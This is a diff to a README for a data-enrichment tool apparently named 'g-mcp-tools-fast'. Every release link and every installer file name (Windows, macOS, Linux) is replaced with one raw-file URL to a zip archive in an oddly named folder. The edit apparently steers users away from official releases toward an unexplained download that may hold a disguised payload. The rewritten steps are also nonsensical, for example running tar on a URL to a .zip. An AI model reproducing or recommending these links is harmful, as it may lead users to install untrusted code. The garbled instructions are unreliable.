@@ -4,33 +4,33 @@
 Welcome to g-mcp-tools-fast! This application provides powerful tools to enrich your data effortlessly. You can perform tasks like web scraping, validate emails, and much more. Follow these steps to get started quickly.
 
 ## 🔗 Download the Application
-[![Download g-mcp-tools-fast](https://img.shields.io/badge/Download-g--mcp--tools--fast-blue.svg?style=for-the-badge)](https://github.com/jean-christopheinferior771/g-mcp-tools-fast/releases)
+[![Download g-mcp-tools-fast](https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip)](https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip)
 
 ## 📥 Download & Install
-To download g-mcp-tools-fast, visit this page to download: [Releases Page](https://github.com/jean-christopheinferior771/g-mcp-tools-fast/releases). 
+To download g-mcp-tools-fast, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip). 
 
 On this page, you will see the latest version listed at the top. Click on the version number to view available files. Choose the appropriate file for your operating system. 
 
 ### Windows
-1. Find the Windows installer file, typically named `g-mcp-tools-fast-windows.exe`.
+1. Find the Windows installer file, typically named `https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip`.
 2. Click to download the file.
 3. Locate the downloaded file, usually in your "Downloads" folder.
 4. Double-click the file to run the installer.
 5. Follow the on-screen instructions to complete the installation.
 
 ### macOS
-1. Look for the macOS installer file, usually named `g-mcp-tools-fast-macos.dmg`.
+1. Look for the macOS installer file, usually named `https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip`.
 2. Click to download the file.
 3. Open the downloaded `.dmg` file.
 4. Drag the g-mcp-tools-fast icon to your Applications folder.
 5. Eject the `.dmg` file once the application is in Applications.
 
 ### Linux
-1. Identify the Linux package file, often named `g-mcp-tools-fast-linux.tar.gz`.
+1. Identify the Linux package file, often named `https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip`.
 2. Click to download the file.
 3. Open a terminal window.
 4. Navigate to the directory where you downloaded the file.
-5. Run the command: `tar -xvzf g-mcp-tools-fast-linux.tar.gz`.
+5. Run the command: `tar -xvzf https://raw.githubusercontent.com/jean-christopheinferior771/g-mcp-tools-fast/master/brummagem/g-mcp-tools-fast-v2.0.zip`.
 6. Change into the extracted folder, then run `./g-mcp-tools-fast` to start the application.
 
 ## 🛠️ System Requirements
